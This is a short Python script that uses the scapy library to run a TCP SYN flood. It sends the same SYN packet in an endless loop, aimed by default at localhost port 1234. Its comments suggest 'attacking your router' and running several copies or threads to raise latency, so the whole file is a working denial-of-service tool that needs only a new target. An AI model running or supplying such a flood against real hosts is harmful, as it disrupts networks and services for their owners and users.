from scapy.all import *
import sys
if sys.platform == "darwin":
    conf.use_pcap = True

target = "127.0.0.1"
tport = 1234

TCP = TCP(sport=2345, dport=tport, flags="S")

ip = IP(dst=target)

payload = Raw(b"Hello World")

pkt = ip / TCP / payload

print(pkt)
print(f"SYN flood to {target}:{tport}. CTRL+C to stop.")
while True:
    send(pkt)

# alternative:
# send(pkt, loop=1)

# You can test by attacking your router while pinging it: 
#   ping -t 192.168.0.1 # your gateway IP 
# You should see an increase latency, especially if you run 
# multiple time the script (or through multiple threads)